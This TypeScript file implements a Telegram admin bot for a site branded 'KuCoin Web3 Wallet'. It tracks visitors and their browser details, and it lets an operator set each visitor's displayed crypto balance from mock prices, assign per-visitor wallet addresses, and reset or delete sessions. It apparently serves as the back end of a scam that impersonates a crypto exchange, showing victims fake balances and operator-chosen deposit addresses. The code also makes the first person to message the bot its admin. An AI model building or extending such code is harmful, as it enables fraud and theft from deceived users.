// lib/telegram-bot.ts - Telegram Bot for Admin Management
import { visitorStore } from "./visitor-store"
import { cryptocurrencies } from "../data/cryptocurrencies"
import { getMockCryptoPrices } from "../lib/mock-crypto-prices"

interface TelegramMessage {
  message_id: number
  from: {
    id: number
    first_name: string
    username?: string
  }
  chat: {
    id: number
    type: string
  }
  text: string
}

interface TelegramUpdate {
  update_id: number
  message: TelegramMessage
}

class TelegramBot {
  private botToken: string
  private adminChatId: number | null = null

  constructor(botToken: string) {
    this.botToken = botToken
  }

  private async sendMessage(chatId: number, text: string, parseMode = "HTML") {
    try {
      const response = await fetch(`https://api.telegram.org/bot${this.botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: parseMode,
        }),
      })
      return await response.json()
    } catch (error) {
      console.error("Error sending Telegram message:", error)
    }
  }

  async handleUpdate(update: TelegramUpdate) {
    const message = update.message
    if (!message || !message.text) return

    const chatId = message.chat.id
    const text = message.text.trim()
    const username = message.from.username || message.from.first_name

    // Set admin chat ID on first interaction
    if (!this.adminChatId) {
      this.adminChatId = chatId
    }

    console.log(`[TELEGRAM] Command from ${username}: ${text}`)

    if (text.startsWith("/start")) {
      await this.sendMessage(
        chatId,
        `🤖 <b>KuCoin Web3 Wallet Admin Bot</b>

Welcome ${username}! 

<b>Available Commands:</b>
/visitors - Show all visitors
/stats - Show statistics
/help - Show this help

<b>Visitor Management:</b>
/add_balance [visitor_id] [crypto] [amount]
/set_address [visitor_id] [crypto] [address]  
/reset [visitor_id] - Reset session
/delete [visitor_id] - Delete visitor

<i>Bot is now active and will send notifications!</i>`,
      )
    } else if (text === "/visitors") {
      await this.handleVisitorsCommand(chatId)
    } else if (text === "/stats") {
      await this.handleStatsCommand(chatId)
    } else if (text.startsWith("/add_balance")) {
      await this.handleAddBalanceCommand(chatId, text)
    } else if (text.startsWith("/set_address")) {
      await this.handleSetAddressCommand(chatId, text)
    } else if (text.startsWith("/reset")) {
      await this.handleResetCommand(chatId, text)
    } else if (text.startsWith("/delete")) {
      await this.handleDeleteCommand(chatId, text)
    } else if (text === "/help") {
      await this.sendMessage(
        chatId,
        `<b>KuCoin Admin Bot Commands:</b>

<b>📊 Information:</b>
/visitors - List all active visitors
/stats - Show visitor statistics

<b>💰 Balance Management:</b>
/add_balance [visitor_id] [crypto] [amount]
Example: <code>/add_balance visitor-123 bitcoin 0.5</code>

<b>🏠 Address Management:</b>
/set_address [visitor_id] [crypto] [address]
Example: <code>/set_address visitor-123 bitcoin bc1q...</code>

<b>🔄 Session Management:</b>
/reset [visitor_id] - Reset visitor session
/delete [visitor_id] - Delete visitor completely

<i>Tip: Use /visitors first to get visitor IDs</i>`,
      )
    } else {
      await this.sendMessage(chatId, "❓ Unknown command. Use /help to see available commands.")
    }
  }

  private async handleVisitorsCommand(chatId: number) {
    const visitors = visitorStore.getAllVisitors()

    if (visitors.length === 0) {
      await this.sendMessage(chatId, "👥 <b>No active visitors found</b>")
      return
    }

    let message = `👥 <b>Active Visitors (${visitors.length})</b>\n\n`

    visitors.forEach((visitor, index) => {
      const onlineStatus = visitor.isOnline ? "🟢 Online" : "🔴 Offline"
      const cryptoCount = visitor.selectedCryptos.length
      const balanceCount = visitor.balances.size

      message += `<b>${index + 1}. ${visitor.name}</b>
📱 ID: <code>${visitor.id}</code>
${onlineStatus}
💰 Cryptos: ${cryptoCount} selected, ${balanceCount} with balance
🌐 Browser: ${visitor.browserInfo || "Unknown"}
${visitor.resetRequested ? "⚠️ Reset Requested" : ""}

`
    })

    await this.sendMessage(chatId, message)
  }

  private async handleStatsCommand(chatId: number) {
    const visitors = visitorStore.getAllVisitors()
    const onlineCount = visitors.filter((v) => v.isOnline).length
    const offlineCount = visitors.length - onlineCount
    const withBalances = visitors.filter((v) => v.balances.size > 0).length

    const message = `📊 <b>Visitor Statistics</b>

👥 Total Visitors: ${visitors.length}
🟢 Online: ${onlineCount}
🔴 Offline: ${offlineCount}
💰 With Balances: ${withBalances}

<b>Popular Cryptocurrencies:</b>
${this.getPopularCryptos(visitors)}

<i>Last updated: ${new Date().toLocaleString()}</i>`

    await this.sendMessage(chatId, message)
  }

  private getPopularCryptos(visitors: any[]): string {
    const cryptoCounts: { [key: string]: number } = {}

    visitors.forEach((visitor) => {
      visitor.selectedCryptos.forEach((crypto: string) => {
        cryptoCounts[crypto] = (cryptoCounts[crypto] || 0) + 1
      })
    })

    const sorted = Object.entries(cryptoCounts)
      .sort(([, a], [, b]) => b - a)
      .slice(0, 5)

    return sorted.map(([crypto, count]) => `• ${crypto}: ${count} users`).join("\n")
  }

  private async handleAddBalanceCommand(chatId: number, text: string) {
    const parts = text.split(" ")
    if (parts.length !== 4) {
      await this.sendMessage(
        chatId,
        "❌ <b>Invalid format</b>\n\nUse: <code>/add_balance [visitor_id] [crypto] [amount]</code>\nExample: <code>/add_balance visitor-123 bitcoin 0.5</code>",
      )
      return
    }

    const [, visitorId, cryptoId, amountStr] = parts
    const amount = Number.parseFloat(amountStr)

    if (isNaN(amount) || amount <= 0) {
      await this.sendMessage(chatId, "❌ Invalid amount. Must be a positive number.")
      return
    }

    const visitor = visitorStore.getVisitor(visitorId)
    if (!visitor) {
      await this.sendMessage(chatId, `❌ Visitor <code>${visitorId}</code> not found.`)
      return
    }

    const crypto = cryptocurrencies.find((c) => c.id === cryptoId)
    if (!crypto) {
      await this.sendMessage(chatId, `❌ Cryptocurrency <code>${cryptoId}</code> not found.`)
      return
    }

    const mockPrices = getMockCryptoPrices()
    const currentPrice = mockPrices.get(cryptoId) || 1
    const chfBalance = (amount * currentPrice).toFixed(2)

    visitorStore.updateBalance(visitorId, cryptoId, amount.toFixed(8), chfBalance, "0.00")

    await this.sendMessage(
      chatId,
      `✅ <b>Balance Added</b>

👤 Visitor: ${visitor.name}
💰 Amount: ${amount} ${crypto.symbol.toUpperCase()}
💵 Value: ~${chfBalance} CHF

<i>Balance updated successfully!</i>`,
    )
  }

  private async handleSetAddressCommand(chatId: number, text: string) {
    const parts = text.split(" ")
    if (parts.length !== 4) {
      await this.sendMessage(
        chatId,
        "❌ <b>Invalid format</b>\n\nUse: <code>/set_address [visitor_id] [crypto] [address]</code>\nExample: <code>/set_address visitor-123 bitcoin bc1q...</code>",
      )
      return
    }

    const [, visitorId, cryptoId, address] = parts

    const visitor = visitorStore.getVisitor(visitorId)
    if (!visitor) {
      await this.sendMessage(chatId, `❌ Visitor <code>${visitorId}</code> not found.`)
      return
    }

    const crypto = cryptocurrencies.find((c) => c.id === cryptoId)
    if (!crypto) {
      await this.sendMessage(chatId, `❌ Cryptocurrency <code>${cryptoId}</code> not found.`)
      return
    }

    visitorStore.updateCryptoAddress(visitorId, cryptoId, address)

    await this.sendMessage(
      chatId,
      `✅ <b>Address Updated</b>

👤 Visitor: ${visitor.name}
💰 Crypto: ${crypto.name} (${crypto.symbol.toUpperCase()})
🏠 Address: <code>${address}</code>

<i>Address set successfully!</i>`,
    )
  }

  private async handleResetCommand(chatId: number, text: string) {
    const parts = text.split(" ")
    if (parts.length !== 2) {
      await this.sendMessage(
        chatId,
        "❌ <b>Invalid format</b>\n\nUse: <code>/reset [visitor_id]</code>\nExample: <code>/reset visitor-123</code>",
      )
      return
    }

    const visitorId = parts[1]
    const visitor = visitorStore.getVisitor(visitorId)
    if (!visitor) {
      await this.sendMessage(chatId, `❌ Visitor <code>${visitorId}</code> not found.`)
      return
    }

    visitorStore.markVisitorForReset(visitorId)

    await this.sendMessage(
      chatId,
      `🔄 <b>Session Reset Requested</b>

👤 Visitor: ${visitor.name}
📱 ID: <code>${visitorId}</code>

<i>The visitor will be reset on their next page load.</i>`,
    )
  }

  private async handleDeleteCommand(chatId: number, text: string) {
    const parts = text.split(" ")
    if (parts.length !== 2) {
      await this.sendMessage(
        chatId,
        "❌ <b>Invalid format</b>\n\nUse: <code>/delete [visitor_id]</code>\nExample: <code>/delete visitor-123</code>",
      )
      return
    }

    const visitorId = parts[1]
    const visitor = visitorStore.getVisitor(visitorId)
    if (!visitor) {
      await this.sendMessage(chatId, `❌ Visitor <code>${visitorId}</code> not found.`)
      return
    }

    const deleted = visitorStore.deleteVisitor(visitorId)
    if (deleted) {
      await this.sendMessage(
        chatId,
        `🗑️ <b>Visitor Deleted</b>

👤 ${visitor.name} has been permanently deleted.
📱 ID: <code>${visitorId}</code>

<i>This action cannot be undone.</i>`,
      )
    } else {
      await this.sendMessage(chatId, "❌ Failed to delete visitor.")
    }
  }

  // Notification methods
  async notifyNewVisitor(visitor: any) {
    if (!this.adminChatId) return

    await this.sendMessage(
      this.adminChatId,
      `🆕 <b>New Visitor Joined!</b>

👤 Name: ${visitor.name}
📱 ID: <code>${visitor.id}</code>
🌐 Browser: ${visitor.browserInfo || "Unknown"}
⏰ Time: ${new Date().toLocaleString()}

Use /visitors to see all active visitors.`,
    )
  }

  async notifyVisitorCompleted(visitor: any) {
    if (!this.adminChatId) return

    await this.sendMessage(
      this.adminChatId,
      `✅ <b>Visitor Completed Onboarding!</b>

👤 ${visitor.name}
💰 Selected ${visitor.selectedCryptos.length} cryptocurrencies
📱 ID: <code>${visitor.id}</code>

Ready for balance management!`,
    )
  }
}

// Export singleton
let telegramBot: TelegramBot | null = null

export function initTelegramBot(botToken: string): TelegramBot {
  if (!telegramBot) {
    telegramBot = new TelegramBot(botToken)
  }
  return telegramBot
}

export function getTelegramBot(): TelegramBot | null {
  return telegramBot
}
